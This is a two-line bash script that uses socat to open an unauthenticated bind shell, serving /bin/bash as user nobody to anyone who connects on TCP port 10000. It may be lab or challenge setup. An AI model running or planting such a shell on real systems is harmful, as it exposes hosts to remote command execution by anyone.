#!/bin/bash

socat tcp-listen:10000,reuseaddr,fork,su=nobody exec:/bin/bash